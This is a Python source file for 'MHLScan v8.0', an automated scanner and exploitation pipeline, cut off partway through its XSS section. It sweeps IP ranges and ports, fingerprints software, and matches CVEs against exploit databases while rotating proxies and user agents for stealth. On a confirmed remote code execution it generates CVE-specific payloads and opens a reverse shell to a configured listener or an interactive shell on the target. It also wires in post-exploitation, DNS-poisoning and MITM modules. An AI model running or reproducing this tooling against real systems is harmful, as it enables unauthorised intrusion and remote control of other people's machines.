#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""mhlscan.py — MHLScan v8.0 (CIDR + Subdomain + Full Pipeline)"""

import argparse, concurrent.futures, ipaddress, json, os, re, signal, socket, sys, time, warnings
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote_plus, urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

try:
    from urllib3 import PoolManager, ProxyManager, Timeout
    from urllib3.exceptions import (ConnectTimeoutError, MaxRetryError,
                                    TimeoutError, InsecureRequestWarning)
except ImportError:
    print("[!] pip install urllib3"); sys.exit(1)

# Cache recon — mencegah scan port berulang untuk host yang sama
_RECON_CACHE = {}
_RECON_CACHE_TTL = 60


def _recon_cached(url, timeout=2, max_workers=50, ttl=None):
    """Cache recon per host, TTL default 60 detik."""
    try:
        host = urlparse(url).hostname or url
    except Exception:
        host = url
    now = time.time()
    if host in _RECON_CACHE:
        ts, cached = _RECON_CACHE[host]
        if now - ts < (ttl or _RECON_CACHE_TTL):
            return cached
    rec = _recon.recon(url, timeout=timeout, max_workers=max_workers)
    _RECON_CACHE[host] = (now, rec)
    return rec


try:
    import _exploits, _stealth, _shell, _fingerprint, _general, _nuclei
    import _recon, _payloads, _version, _plugins, _waf, _rce, _subdomain, _geoip, _netdev, _cve_intel, _cve_db, _intel
    import _httpmethods
    import _reporter
    import _crawler
    import _oast
    import _auth
    import _aspnet_waf
    import _memory, _playbook, _extractor, _sslcheck, _headers, _wstg
    import _cve_local, _chain, _sqlscan
    import _payload_synth
    import _discovery
    import _httpsmuggle
    import _crawler2
    import _exploits_db
    import _payload_gen
    import _post_exploit
    import _xss
    import _jwt
    import _paramdiscovery
    import _dnspoison
    import _mitm
except ImportError as e:
    print("[!] Modul internal: " + str(e)); sys.exit(1)


__version__ = "8.0.0"

# === Reports directory ===
REPORTS_DIR = Path(__file__).parent / "reports"
REPORTS_DIR.mkdir(exist_ok=True)


def _reports_subdir():
    """Return subdir reports/YYYY-MM/."""
    from datetime import datetime as _dt
    now = _dt.now()
    sub = REPORTS_DIR / now.strftime("%Y-%m")
    sub.mkdir(parents=True, exist_ok=True)
    return sub


def _default_report_base():
    """Return default base path untuk report."""
    from datetime import datetime as _dt, timezone as _tz
    ts = _dt.now(_tz.utc).strftime("%Y%m%d_%H%M%S")
    sub = _reports_subdir()
    return str(sub / f"report_mhlscan_{ts}")
RED    = '\033[91m'
GREEN  = '\033[32m'
YELLOW = '\033[1;33m'
BLUE   = '\033[94m'
CYAN   = '\033[96m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'

gl_http_pool = None
gl_interrupted = False

class _HTTPFlags:
    enabled = True
    put = False

GL_OAST_CLIENT = None
GL_AGGRESSIVE = False
GL_CRAWL_ENABLED = False
GL_CRAWL_MAX_PAGES = 50
GL_CRAWL_MAX_DEPTH = 3
GL_AUTH_CONFIG = None
_nuclei_run_flag = True
_plugins_enabled = True
GL_REV_SHELL = True
GL_LHOST = None
GL_LPORT = 4444
GL_PARAM_DISCOVERY = False
GL_JWT_ANALYSIS = False
GL_SMUGGLE = False
GL_XSS_ENABLED = False
GL_XSS_STORED = False
GL_CRAWL_MODE = 'bfs'
GL_CRAWL_RATE = 1.0
GL_AUTO_EXPLOIT = False
GL_POST_READ = False
GL_POST_WRITE = False

JAVA_STACKS = {"jboss", "tomcat", "wso2", "spring"}
SEVERITY_COLOR = {"critical": RED, "high": RED, "medium": YELLOW, "low": BLUE, "info": CYAN}


# ============================================================
# HELPERS — CIDR / IP detection
# ============================================================
def _is_cidr(s):
    return bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$', s.strip()))


def _is_ip_url(url):
    try:
        host = urlparse(url).hostname
        ipaddress.ip_address(host)
        return True
    except (ValueError, TypeError):
        return False


def _tcp_connect(ip, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

def _is_ip_range(s):
    return bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3}$', s.strip()))


def _is_ip_list(s):
    parts = [p.strip() for p in s.split(',') if p.strip()]
    if len(parts) < 2:
        return False
    for p in parts:
        try:
            ipaddress.ip_address(p)
        except ValueError:
            return False
    return True


def _expand_ip_range(s):
    m = re.match(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})-(\d{1,3})$', s.strip())
    if not m:
        return []
    a, b, c, d, e = (int(x) for x in m.groups())
    if d > e or e > 255:
        return []
    return [f"http://{a}.{b}.{c}.{i}" for i in range(d, e + 1)]


def parse_targets(raw):
    """Smart parser: CIDR tetap CIDR, IP tidak auto-:8080, IP:port preserve."""
    raw = raw.strip()
    if not raw:
        return []
    if _is_cidr(raw):
        return [raw]
    if raw.startswith(('http://', 'https://')):
        return [raw]
    if ':' in raw and '/' not in raw:
        host, _, port = raw.rpartition(':')
        if port.isdigit():
            return [f"http://{host}:{port}"]
    if _is_ip_range(raw):
        return _expand_ip_range(raw)
    if _is_ip_list(raw):
        return [f"http://{p.strip()}" for p in raw.split(',') if p.strip()]
    return [f"http://{raw}"]


def parse_target_file(path):
    targets = []
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                targets.extend(parse_targets(line))
    return targets


# ============================================================
# CIDR EXPANSION — Live discovery
# ============================================================
def expand_cidr(cidr_str, max_hosts=256, quick_ports=None,
                workers=100, timeout=1.5, live_only=True):
    quick_ports = quick_ports or [80, 443, 8080, 8000, 8443]
    try:
        net = ipaddress.ip_network(cidr_str.strip(), strict=False)
    except ValueError as e:
        print(f"  {RED}[!] CIDR tidak valid '{cidr_str}': {e}{ENDC}")
        return []

    hosts = list(net.hosts())
    if len(hosts) > max_hosts:
        print(f"  {RED}[!] CIDR {cidr_str} = {len(hosts)} host > --cidr-max {max_hosts}{ENDC}")
        return []
    if not hosts:
        print(f"  {YELLOW}[!] CIDR {cidr_str} kosong{ENDC}")
        return []

    ips = [str(ip) for ip in hosts]
    print(f"  {BLUE}[*] CIDR {cidr_str} → {len(ips)} IP{ENDC}")

    if not live_only:
        return [f"http://{ip}" for ip in ips]

    print(f"  {CYAN}[*] Live discovery (TCP {quick_ports}, {workers} threads, {timeout}s)...{ENDC}")

    def _check(ip):
        for port in quick_ports:
            if _tcp_connect(ip, port, timeout):
                return ip
        return None

    live, done = [], 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_check, ip): ip for ip in ips}
        for fut in concurrent.futures.as_completed(futures):
            done += 1
            res = fut.result()
            if res:
                live.append(res)
            if done % 50 == 0 or done == len(ips):
                print(f"    progress: {done}/{len(ips)} probed, {len(live)} live", flush=True)

    print(f"  {GREEN}[+] Live: {len(live)}/{len(ips)} host respons{ENDC}")
    return [f"http://{ip}" for ip in live]


# ============================================================
# WEB PORT EXPANSION — Parallel, semua open port
# ============================================================
def expand_web_ports(targets, timeout=3, workers=25):
    NON_HTTP_PORTS = {
        21, 22, 23, 25, 53, 110, 111, 135, 139, 143, 445, 587, 993, 995,
        1433, 1521, 2049, 2375, 3306, 3389, 5432, 5900, 5984, 6379,
        10000, 11211, 27017,
    }
    HTTPS_PORTS = {443, 8443, 9443, 10443}

    def _process_one(url):
        if not _is_ip_url(url):
            return [url]
        host = urlparse(url).hostname
        try:
            rec = _recon_cached(url, timeout=max(timeout, 2), max_workers=50)
            ports = rec.get("open_ports", [])
        except Exception:
            return []
        if not ports:
            return []
        urls = []
        for p in ports:
            if p in NON_HTTP_PORTS:
                continue
            scheme = "https" if p in HTTPS_PORTS else "http"
            proto = _subdomain.probe_protocol(f"{host}:{p}", timeout=4)
            if proto:
                urls.append(f"{proto}://{host}:{p}")
        return urls

    print(f"  {CYAN}[*] Parallel expand ({workers} threads)...{ENDC}")
    expanded, done = [], 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_process_one, url): url for url in targets}
        for fut in concurrent.futures.as_completed(futures):
            done += 1
            try:
                expanded.extend(fut.result())
            except Exception:
                pass
            if done % 10 == 0 or done == len(targets):
                print(f"    progress: {done}/{len(targets)}, {len(expanded)} URL built", flush=True)

    return list(dict.fromkeys(expanded))


# ============================================================
# HTTP POOL
# ============================================================
def configure_http_pool(timeout, proxy, stealth, proxy_list):
    global gl_http_pool
    t = Timeout(connect=timeout, read=timeout * 2)
    if proxy:
        base = ProxyManager(proxy_url=proxy, timeout=t, cert_reqs='CERT_NONE', retries=False)
    else:
        base = PoolManager(timeout=t, cert_reqs='CERT_NONE', retries=False)
    proxies = []
    if proxy_list and os.path.exists(proxy_list):
        with open(proxy_list) as f:
            proxies = [l.strip() for l in f if l.strip()]
    gl_http_pool = _stealth.StealthPool(
        base, proxy_list=proxies, jitter=(0.5, 2.0) if stealth else (0, 0),
        rate_rps=1.0 if stealth else 0, rotate_ua=stealth, timeout=t)
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
    _exploits.set_http_pool(gl_http_pool)
    return gl_http_pool


# ============================================================
# POC BUILDER
# ============================================================
def _build_poc(f, target_url):
    fid = str(f.get("id", ""))
    if fid.startswith("service:") or f.get("type") == "service":
        svc_name = fid.replace("service:", "").split(":")[0]
        port = f.get("port", "?")
        host = urlparse(target_url).hostname or target_url
        pocs = {
            "redis": f"redis-cli -h {host} -p {port} PING",
            "memcached": f"echo stats | nc {host} {port}",
            "elasticsearch": f"curl -sk http://{host}:{port}/",
            "mongodb": f"mongosh mongodb://{host}:{port}",
            "mysql": f"mysql -h {host} -P {port} -u root -p",
            "postgresql": f"psql -h {host} -p {port} -U postgres",
            "ssh": f"ssh -p {port} {host}", "ftp": f"ftp {host} {port}",
            "docker": f"curl -sk http://{host}:{port}/version",
            "telnet": f"telnet {host} {port}",
            "smb": f"smbclient -L {host} -p {port} -N",
            "vnc": f"vncviewer {host}:{port}",
        }
        f["poc"] = pocs.get(svc_name, f"nc {host} {port}")
        f["poc_url"] = f"{host}:{port}"
        return f

    url = f.get("url") or (target_url.rstrip("/") + (f.get("path") or ""))
    method = (f.get("method") or "GET").upper()
    q = chr(34)
    if method == "GET":
        f["poc"] = "curl -sk " + q + url + q
    elif method == "POST":
        f["poc"] = "curl -sk -X POST " + q + url + q
    else:
        f["poc"] = "curl -sk -X " + method + " " + q + url + q
    f["poc_url"] = url
    return f


def _enrich(f, url, source):
    if "source" not in f: f["source"] = source
    if "url" not in f: f["url"] = url.rstrip('/') + (f.get("path") or "")
    if "endpoint" not in f:
        f["endpoint"] = f.get("path") or f.get("url") or url
    if "evidence" not in f: f["evidence"] = "pattern match"
    _build_poc(f, url)
    return f


# ============================================================
# CORE SCAN
# ============================================================
def check_target(url, timeout, min_sev="medium", skip_generic=False,
                 jboss_only=False, deep_services=False, batch_mode=False,
                 interactive_allowed=True):
    global GL_AGGRESSIVE, GL_JWT_ANALYSIS, GL_LHOST, GL_LPORT, GL_OAST_CLIENT, GL_PARAM_DISCOVERY, GL_REV_SHELL, GL_SMUGGLE, GL_XSS_ENABLED, GL_XSS_STORED
    host = urlparse(url).hostname or url
    result = {
        "target": url, "ip": None,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "stack": "unknown", "stacks_all": [], "server": "", "powered_by": "",
        "evidence": [], "findings": [], "vulnerabilities": [], "errors": [],
        "version": None, "plugins": [], "nuclei_templates": [],
        "service_findings": [], "waf": None,
        "pipeline": {"recon": "pending", "fingerprint": "pending",
                     "cve": "pending", "payload": "pending"},
    }
    try:
        result["ip"] = socket.gethostbyname(host)
    except Exception:
        pass

    waf_info = _waf.detect_waf(url)
    if waf_info:
        waf_name = waf_info.get("waf", "?") if isinstance(waf_info, dict) else str(waf_info)
        result["waf"] = waf_name
        result["waf_confidence"] = (waf_info.get("confidence", "?")
                                     if isinstance(waf_info, dict) else "?")
        result["waf_evidence"] = (waf_info.get("evidence", "")
                                   if isinstance(waf_info, dict) else "")
        print(f"  {YELLOW}[!] WAF/CDN: {waf_name} "
              f"({result['waf_confidence']}){ENDC}")

    # === ASP.NET WAF / Request Validation ===
    try:
        _r_aspnet = gl_http_pool.request('GET', url,
            timeout=min(timeout, 5), redirect=False)
        _aspnet = _aspnet_waf.detect_aspnet_waf(_r_aspnet)
        if _aspnet:
            result["aspnet_waf"] = _aspnet
            if not result.get("waf"):
                result["waf"] = _aspnet["waf"]
            print(f"  {CYAN}[aspnet] {_aspnet['waf']} ({_aspnet['type']}){ENDC}")
    except Exception as _e:
        result["errors"].append(f"aspnet_waf: {type(_e).__name__}")

    # LAYER 0: RECON
    rec = None
    try:
        print(f"  {CYAN}[recon] scanning ports...{ENDC}", flush=True)
        rec = _recon_cached(url, timeout=min(timeout, 2), max_workers=50)
        result["recon"] = rec
        result["pipeline"]["recon"] = "completed"
        if rec.get("open_ports"):
            print(f"  {CYAN}[recon] ports: {', '.join(str(p) for p in rec['open_ports'][:10])}{ENDC}")
            if rec.get("databases"):
                print(f"  {CYAN}[recon] databases: {', '.join(rec['databases'])}{ENDC}")
            if rec.get("http") and rec["http"].get("technologies"):
                print(f"  {CYAN}[recon] tech: {', '.join(rec['http']['technologies'])}{ENDC}")
            if rec.get("tls") and rec["tls"].get("version"):
                print(f"  {CYAN}[recon] tls: {rec['tls']['version']}{ENDC}")
            if rec.get("os_guess") and rec["os_guess"] != "unknown":
                print(f"  {CYAN}[recon] os: {rec['os_guess']}{ENDC}")
    except Exception as e:
        result["pipeline"]["recon"] = "error"
        result["errors"].append(f"recon: {type(e).__name__}: {e}")

    # === LAYER 0.5: NETWORK DEVICE DETECTION ===
    if rec and rec.get("open_ports"):
        try:
            netdev = _netdev.detect_netdev(url, rec["open_ports"], gl_http_pool,
                                            timeout=min(timeout, 5))
            result["netdev"] = netdev
            if netdev["is_network_device"]:
                result["stacks_all"].append(netdev["device_type"] or netdev["vendor"])
                result["evidence"].append(f"netdev: {netdev['vendor']} ({netdev['device_type']})")
                print(f"  {CYAN}[netdev] {netdev['vendor'] or 'unknown'} "
                      f"({netdev['device_type'] or 'unknown'}){ENDC}")
                if netdev["open_netdev_ports"]:
                    ports_str = ", ".join(f"{p['port']}/{p['service']}" for p in netdev["open_netdev_ports"])
                    print(f"  {CYAN}[netdev] ports: {ports_str}{ENDC}")
                if netdev.get("snmp"):
                    print(f"  {YELLOW}[netdev] SNMP public ({netdev['snmp']['vendor']}){ENDC}")
                if netdev.get("cves_hint"):
                    print(f"  {CYAN}[netdev] CVE hint: {', '.join(netdev['cves_hint'])}{ENDC}")
        except Exception as e:
            result["errors"].append(f"netdev: {type(e).__name__}")

    # === LAYER 0.6: INFO EXTRACTOR (passive) ===
    _r0 = None
    try:
        _r0 = gl_http_pool.request('GET', url, timeout=min(timeout, 5), redirect=False)
        _body = (_r0.data or b'')[:500000]
        _ext = _extractor.extract_from_response(_body, _r0.headers)
        if _ext:
            result["extracted"] = _ext
            if _extractor.is_interesting(_ext):
                _keys = [k for k in _ext.keys() if k != "emails"]
                print(f"  {YELLOW}[extract] sensitive: {', '.join(_keys)}{ENDC}")
    except Exception as _e:
        result["errors"].append(f"extractor: {type(_e).__name__}")

    # === LAYER 0.7: HTTP SECURITY HEADERS ===
    try:
        if _r0 is not None:
            _hdr_check = _headers.check_headers(_r0.headers)
            for _hf in _hdr_check.get("findings", []):
                _enrich(_hf, url, "headers")
                result["findings"].append(_hf)
    except Exception as _e:
        result["errors"].append(f"headers: {type(_e).__name__}")

    # === LAYER 0.8: SSL CERT EXPIRY ===
    try:
        if rec and 443 in (rec.get("open_ports") or []):
            _cert = _sslcheck.check_cert(host, 443, timeout=10)
            if _cert and _cert.get("warning"):
                result["ssl_cert"] = _cert
                result["findings"].append({
                    "id": "ssl-cert-" + ("expired" if _cert["expired"] else "expiring"),
                    "name": f"SSL cert {_cert['warning']}",
                    "severity": _cert["severity"],
                    "evidence": f"Expires {_cert['expires']} ({_cert['days_left']}d)",
                    "source": "sslcheck",
                    "type": "tls",
                })
    except Exception as _e:
        result["errors"].append(f"sslcheck: {type(_e).__name__}")

    # LAYER 1: FINGERPRINT
    fp = _fingerprint.detect(url, gl_http_pool, timeout=min(timeout, 3))
    result["stack"] = fp["stack"]
    result["stacks_all"] = list(fp["stacks"])
    result["server"] = fp["server"]
    result["powered_by"] = fp["powered_by"]
    result["evidence"] = list(fp["evidence"])
    result["pipeline"]["fingerprint"] = (
        "error" if any(x.startswith("error:") for x in fp["evidence"])
        else "completed")

    if rec and rec.get("http"):
        recon_techs = set(rec["http"].get("technologies") or [])
        for t in recon_techs:
            if t in _fingerprint.PRIORITY and t not in result["stacks_all"]:
                result["stacks_all"].append(t)
                result["evidence"].append(f"recon-cookie: {t}")
        if (fp["stack"] in ("unknown", "php", "apache", "nginx", "cloudflare", "iis")
                and recon_techs):
            for s in _fingerprint.PRIORITY:
                if s in recon_techs:
                    fp["stack"] = s
                    result["stack"] = s
                    result["evidence"].append(f"recon-override: {s}")
                    break

    if fp["evidence"]:
        ev = "; ".join(fp["evidence"][:3])
        print(f"  {CYAN}[fingerprint] {fp['stack']}{ENDC} ({ev})")

    # LAYER 1.5: VERSION
    if not jboss_only:
        ver = _version.detect_version(url, gl_http_pool, fp["stack"],
                                      timeout=min(timeout, 5))
        result["version"] = ver
        if ver["version"]:
            print(f"  {CYAN}[version] {ver['version']} ({ver['confidence']}){ENDC}")
            
        # === LAYER 1.6: NVD CVE INTELLIGENCE (Multi-Source) ===
        if ver["version"] and fp["stack"] in _cve_intel.CPE_MAPPING:
            nvd_cves = _cve_intel.get_cves_from_nvd(fp["stack"], ver["version"])
            for cve in nvd_cves:
                if cve["severity"] in ("critical", "high"):
                    v = {"id": cve["id"],
                         "name": cve["description"][:100] + "...",
                         "type": "nvd-cve",
                         "severity": cve["severity"],
                         "url": url, "endpoint": url,
                         "evidence": f"NVD CVSS {cve['score']}",
                         "source": "nvd-intel"}
                    _build_poc(v, url)
                    result["vulnerabilities"].append(v)
                    print(f"  {SEVERITY_COLOR.get(cve['severity'], ENDC)}[{cve['severity']:>8}]{ENDC} [NVD] {cve['id']} - CVSS {cve['score']}{ENDC}")

        # === LAYER 1.7: MULTI-SOURCE INTEL (KEV + EPSS + EDB) ===
        if result["vulnerabilities"]:
            try:
                cve_ids = [v["id"] for v in result["vulnerabilities"]
                           if v.get("id", "").startswith("CVE-")]
                if cve_ids:
                    print(f"  {CYAN}[intel] Enriching {len(cve_ids)} CVE dengan multi-source...{ENDC}")
                    intel_results = _intel.batch_enrich(cve_ids, verbose=True)
                    intel_map = {i["cve"]: i for i in intel_results}
                    for v in result["vulnerabilities"]:
                        if v["id"] in intel_map:
                            intel = intel_map[v["id"]]
                            v["intel"] = intel
                            v["priority_score"] = intel["priority_score"]
                            if intel["kev"]:
                                v["severity"] = "critical"
                                v["evidence"] += " | CISA KEV: actively exploited"
                                print(f"  {RED}[KEV]{ENDC} {v['id']} sedang dieksploitasi di alam liar!")
                            if intel["exploitdb"] and intel["exploitdb"].get("available"):
                                v["evidence"] += f" | ExploitDB: {intel['exploitdb']['count']} PoC"
                                print(f"  {GREEN}[PoC]{ENDC} {v['id']} punya {intel['exploitdb']['count']} PoC di ExploitDB")
                    # Re-sort by priority
                    result["vulnerabilities"].sort(
                        key=lambda x: x.get("priority_score", 0), reverse=True)

                    # === LAYER 1.8: CVE LOCAL EXECUTE + CHAIN VERIFY ===
                    try:
                        _stack_now = fp["stack"]
                        _ver_now = (result.get("version") or {}).get("version")
                        for _vuln in result["vulnerabilities"][:10]:
                            _cid = _vuln.get("id", "")
                            if not _cid.startswith("CVE-"):
                                continue
                            if _memory.should_skip(_stack_now, _ver_now, _cid):
                                _vuln["verify_skipped"] = "memory:known_failure"
                                continue
                            _local = _cve_local.find_by_cve(_cid)
                            _res = None
                            if _local:
                                _res = _cve_local.execute_checker(_cid, url)
                            if _res and _res.get("status") == "vulnerable":
                                _vuln["verified_rce"] = True
                                _vuln["evidence"] = (_vuln.get("evidence", "") +
                                    " | local-checker: " + _res.get("evidence", ""))
                                _memory.remember(_stack_now, _ver_now, _cid,
                                                 "success", _res.get("evidence", ""))
                            elif _res and _res.get("status") == "not_vulnerable":
                                _memory.remember(_stack_now, _ver_now, _cid,
                                                 "failure", "local-checker:no match")
                            _matches = [f for f in result.get("findings", [])
                                        if f.get("source") == "nuclei"
                                        and _cid in (f.get("id") or "")]
                            if _matches:
                                _chain_r = _chain.verify_chain(
                                    _cid, _ver_now, _matches,
                                    fixed_version=(_local or {}).get("fixed_version"))
                                _vuln["chain"] = _chain_r
                                if _chain_r["verified"]:
                                    _vuln["verified_rce"] = True
                    except Exception as _e:
                        result["errors"].append(f"cve_local/chain: {type(_e).__name__}")

            except Exception as e:
                result["errors"].append(f"intel: {type(e).__name__}: {e}")

    # LAYER 1.7: PLUGINS
    if _plugins_enabled and fp["stack"] in ("wordpress", "joomla", "drupal"):
        try:
            pf = _plugins.detect_plugins(url, gl_http_pool, fp["stack"],
                                         timeout=min(timeout, 5))
            result["plugins"] = pf
            if pf:
                print(f"  {CYAN}[plugins] {len(pf)} terdeteksi{ENDC}")
                for p in pf[:10]:
                    v = f" v{p['version']}" if p.get("version") else ""
                    print(f"    {p['slug']}{v} ({p['evidence']})")
        except Exception as e:
            result["errors"].append(f"plugins: {type(e).__name__}")

    # LAYER 2: GENERIC
    if not skip_generic and not jboss_only:
        print(f"  {CYAN}[generic] checking...{ENDC}", flush=True)
        gen = _general.scan_generic(url, gl_http_pool, timeout, min_sev)
        for f in gen:
            _enrich(f, url, "generic")
            result["findings"].append(f)
            c = SEVERITY_COLOR.get(f["severity"], ENDC)
            print(f"  {c}[{f['severity']:>8}]{ENDC} {f['name']} -> {f['endpoint']}")

    # ============ LAYER 2.5: HTTP METHOD SCAN ============
    if _HTTPFlags.enabled and not skip_generic and not jboss_only:
        try:
            _hm = _httpmethods.scan_methods(url, gl_http_pool,
                                               timeout=min(timeout, 5),
                                               allow_put=_HTTPFlags.put)
            for _f in _hm.get('findings', []):
                _enrich(_f, url, 'httpmethods')
                result['findings'].append(_f)
                _c = SEVERITY_COLOR.get(_f['severity'], ENDC)
                print(f"  {_c}[{_f['severity']:>8}]{ENDC} {_f['name']}")
        except Exception as _e:
            result['errors'].append(f'httpmethods: {type(_e).__name__}')

    # LAYER 3: STACK-SPECIFIC
    if not jboss_only:
        sf = _general.scan_stack(url, gl_http_pool, fp["stack"], timeout, min_sev)
        for f in sf:
            _enrich(f, url, "stack:" + fp["stack"])
            result["findings"].append(f)
            c = SEVERITY_COLOR.get(f["severity"], ENDC)
            print(f"  {c}[{f['severity']:>8}]{ENDC} {f['name']} -> {f['endpoint']}")

    # LAYER 4: JAVA CVE
    is_java = fp["stack"] in JAVA_STACKS
    has_non_java = any(s in _nuclei.STACK_KEYWORDS or s in _general.STACK_CHECKS
                       for s in result["stacks_all"])
    is_pure_unknown = (fp["stack"] == "unknown" and not has_non_java)

    if is_java or is_pure_unknown:
        for name, path in _exploits.STATIC_VECTORS.items():
            try:
                r = gl_http_pool.request('HEAD', url + path,
                    headers={"User-Agent": _stealth.USER_AGENTS[0]}, timeout=timeout)
                if r.status in (200, 500):
                    v = {"id": name, "type": "classic", "severity": "high",
                         "url": url + path, "endpoint": path,
                         "evidence": f"HTTP {r.status}", "source": "java"}
                    _build_poc(v, url)
                    result["vulnerabilities"].append(v)
            except Exception:
                pass
        for cve_id, meta in _exploits.CVE_REGISTRY.items():
            try:
                res = meta["checker"](url, {})
                if res.get("status") == "vulnerable":
                    shell_path = res.get("shell_path") or "/"
                    v = {"id": cve_id, "name": meta["name"], "type": "cve",
                         "severity": meta["severity"],
                         "shell_path": res.get("shell_path"),
                         "shell_param": res.get("shell_param"),
                         "url": url.rstrip('/') + shell_path,
                         "endpoint": shell_path,
                         "evidence": res.get("details", ""), "source": "java"}
                    _build_poc(v, url)
                    result["vulnerabilities"].append(v)
            except Exception:
                pass

    # LAYER 5: NUCLEI
    if fp["stack"] in _nuclei.STACK_KEYWORDS:
        templates = _nuclei.get_templates_for_stack(
            fp["stack"], version=result.get("version", {}).get("version"))
        if not templates:
            print(f"  {YELLOW}[!] CVE belum cached untuk {fp['stack']}{ENDC}")
        else:
            result["nuclei_templates"] = [t.name for t in templates]
            print(f"  {CYAN}[*] {len(templates)} template untuk {fp['stack']}{ENDC}")
            if _nuclei.has_binary() and _nuclei_run_flag:
                ok, out, findings = _nuclei.run_nuclei(url, templates)
                if ok:
                    for f in findings:
                        nf = {"id": f["template_id"], "name": f["name"],
                              "severity": f["severity"],
                              "url": f.get("matched_at", url),
                              "endpoint": f.get("matched_at", url),
                              "evidence": "nuclei template match",
                              "source": "nuclei"}
                        _build_poc(nf, url)

                        if any(k in nf["name"].upper() for k in ["RCE", "COMMAND", "EXEC"]):
                            print(f"  {CYAN}[*] Verifying RCE: {nf['url']}{ENDC}")
                            # Detect OS dari stack
                            _os_type = "windows" if fp.get("stack") in ("aspnet", "iis") else "linux"
                            rce_proof = _rce.verify_rce(nf["url"], param="cmd", os_type=_os_type)
                            if rce_proof["success"]:
                                nf["verified_rce"] = True
                                nf["evidence"] += f" | TERVERIFIKASI: {rce_proof['evidence']}"
                                print(f"  {GREEN}[+] RCE TERBUKTI: {rce_proof['evidence']}{ENDC}")
                            else:
                                print(f"  {YELLOW}[!] RCE DETECTED tapi verify gagal "
                                      f"(target mungkin tidak eksekusi, WAF, atau butuh payload lain){ENDC}")
                                print(f"      Manual test: curl -sk {chr(34)}{nf['url']}?cmd=sleep+5{chr(34)}{ENDC}")
                                nf["verified_rce"] = False

                            if nf.get("verified_rce"):
                                # === PAYLOAD SYNTH (generate shell spesifik-CVE) ===
                                try:
                                    _synth = _payload_synth.synthesize_for_cve(
                                        nf.get("id", ""),
                                        lhost=GL_LHOST,
                                        lport=GL_LPORT,
                                        target_meta={"stack": fp.get("stack")},
                                    )
                                    if _synth:
                                        nf["payload_synth"] = _synth
                                        print(f"  {CYAN}[synth] {_synth.get('type')} ready for {nf.get('id')}{ENDC}")
                                except Exception as _e:
                                    result["errors"].append(f"payload_synth: {type(_e).__name__}")

                                if not batch_mode and interactive_allowed:
                                    if GL_REV_SHELL:
                                        print(f"{YELLOW}[*] Reverse Shell Listener port {GL_LPORT}...{ENDC}")
                                        _rce.launch_reverse_shell(nf["url"],
                                            rce_proof.get("param", "cmd"),
                                            lport=GL_LPORT, lhost=GL_LHOST, os_type=_os_type)
                                    else:
                                        print(f"{YELLOW}[*] HTTP Auto-Shell...{ENDC}")
                                        interactive_shell(nf["url"],
                                            rce_proof.get("param", "cmd"))
                                        print(f"{GREEN}[*] Auto-Shell closed.{ENDC}")
                        result["findings"].append(nf)
                        c = SEVERITY_COLOR.get(f["severity"], ENDC)
                        print(f"  {c}[{f['severity']:>8}]{ENDC} [nuclei] {f['name']}")

    # === LAYER 5.4: PARAM DISCOVERY + JWT + SMUGGLE ===
    if GL_PARAM_DISCOVERY and (rec and rec.get("open_ports")):
        if any(p in (80, 443, 8080, 8443, 8000, 8888)
               for p in rec.get("open_ports", [])):
            try:
                _pd = _paramdiscovery.discover_all(url, timeout=min(timeout, 10))
                result["param_discovery"] = _pd
                _n_found = len(_pd.get("bruteforce_findings", []))
                if _n_found:
                    print(f"  {CYAN}[param] {_n_found} hidden params found{ENDC}")
                    for pf in _pd["bruteforce_findings"][:5]:
                        print(f"    - {pf['param']}: {pf['type']}")
            except Exception as _e:
                result["errors"].append(f"param_discovery: {type(_e).__name__}")

    if GL_JWT_ANALYSIS and (rec and rec.get("open_ports")):
        try:
            _r_jwt = gl_http_pool.request('GET', url, timeout=min(timeout, 5),
                                          redirect=False)
            _jwts = _jwt.extract_jwts_from_headers(_r_jwt.headers)
            if not _jwts:
                _jwts = _jwt.extract_jwts_from_text(
                    (_r_jwt.data or b'')[:200000].decode('utf-8', 'ignore'))
            if _jwts:
                _jwts_results = []
                for _t in _jwts[:3]:
                    _res = _jwt.analyze_jwt(_t)
                    if _res.get("valid"):
                        _jwts_results.append(_res)
                        for _f in _res.get("findings", []):
                            _f.update({"url": url, "source": "jwt",
                                       "type": "jwt"})
                            result["findings"].append(_f)
                result["jwt_analysis"] = _jwts_results
                if _jwts_results:
                    print(f"  {CYAN}[jwt] {len(_jwts_results)} JWT analyzed{ENDC}")
        except Exception as _e:
            result["errors"].append(f"jwt: {type(_e).__name__}")

    if GL_SMUGGLE and (rec and rec.get("open_ports")):
        if any(p in (80, 443, 8080, 8443) for p in rec.get("open_ports", [])):
            try:
                _sm = _httpsmuggle.scan_smuggle(url, timeout=min(timeout, 10))
                if _sm.get("findings"):
                    result["smuggle"] = _sm
                    for _sf in _sm["findings"]:
                        _sf.update({"url": url, "source": "smuggle",
                                    "type": "http-smuggle",
                                    "id": "SMUGGLE-" + _sf.get("type", "?"),
                                    "name": "HTTP Smuggling (" + _sf.get("type", "?") + ")"})
                        result["findings"].append(_sf)
                    print(f"  {RED}[!] HTTP Smuggling: {len(_sm['findings'])} finding(s){ENDC}")
            except Exception as _e:
                result["errors"].append(f"smuggle: {type(_e).__name__}")

    # === LAYER 5.45: XSS SCANNER ===
    if GL_XSS_ENABLED and (rec and rec.get("open_ports")):
        if any(p in (80, 443, 8080, 8443, 8000, 8888)
               for p in rec.get("open_ports", [])):
            try:
                _r_xss = gl_http_pool.request('GET', url, timeout=min(timeout, 5),
                                              redirect=False)
                _html_xss = (_r_xss.data or b'')[:300000].decode('utf-8', 'ignore')
                # Ekstrak form untuk XSS test
